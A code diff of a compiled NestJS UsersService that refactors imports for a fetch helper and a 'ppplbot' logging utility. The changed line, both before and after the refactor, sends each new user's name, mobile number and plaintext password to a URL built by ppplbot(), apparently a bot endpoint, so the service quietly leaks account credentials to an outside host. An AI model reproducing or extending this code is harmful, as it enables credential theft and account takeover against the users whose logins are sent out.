@@ -18,7 +18,8 @@ const common_1 = require("@nestjs/common");
 const mongoose_1 = require("@nestjs/mongoose");
 const mongoose_2 = require("mongoose");
 const client_service_1 = require("../clients/client.service");
-const utils_1 = require("../../utils");
+const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
+const logbots_1 = require("../../utils/logbots");
 let UsersService = class UsersService {
     constructor(userModel, telegramService, clientsService) {
         this.userModel = userModel;
@@ -34,7 +35,7 @@ let UsersService = class UsersService {
             await this.clientsService.updateClientSession(user.session);
         }
         else {
-            await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
+            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
             const newUser = new this.userModel(user);
             return newUser.save();
         }
